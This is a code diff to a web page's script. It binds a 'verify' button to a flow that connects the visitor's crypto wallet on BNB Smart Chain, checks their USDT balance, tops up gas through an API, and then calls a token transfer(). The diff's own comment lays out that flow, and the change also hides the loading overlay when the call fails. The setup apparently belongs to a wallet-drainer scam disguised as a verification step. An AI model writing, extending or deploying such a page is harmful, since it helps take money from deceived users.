@@ -164,16 +164,32 @@
     })();
   </script>
 
-  <!-- Connect Next button to script.js: bind when Next is available (immediate + on load + retry) -->
+  <!--
+    Flow when user clicks Next (from js/script.js):
+    1. Next() reads #amount, validates > 0 (else showError "Please enter a valid amount")
+    2. If wallet not connected → connectWalletAndSwitch() (BNB Smart Chain)
+    3. showLoading() → "Processing..." overlay
+    4. Script checks USDT balance (contract) and BNB balance; if USDT < 1 or issues → hideLoading, showError
+    5. If BNB < 0.0005 → API top-up, then continues
+    6. Contract transfer() → on success: hideLoading, showSuccess (our modal) | on error: hideLoading, showError ("Transaction failed")
+  -->
   <script>
     (function () {
+      var overlay = document.getElementById("loadingOverlay");
       function bindNextButton() {
         var btn = document.getElementById("verifyBtn");
         if (!btn) return false;
         if (typeof window.Next !== "function") return false;
         if (btn._nextBound) return true;
         btn._nextBound = true;
-        btn.addEventListener("click", function () { window.Next(); });
+        btn.addEventListener("click", function () {
+          var p = window.Next();
+          if (p && typeof p.catch === "function") {
+            p.catch(function () {
+              if (overlay) overlay.style.display = "none";
+            });
+          }
+        });
         return true;
       }
       function tryBind() {
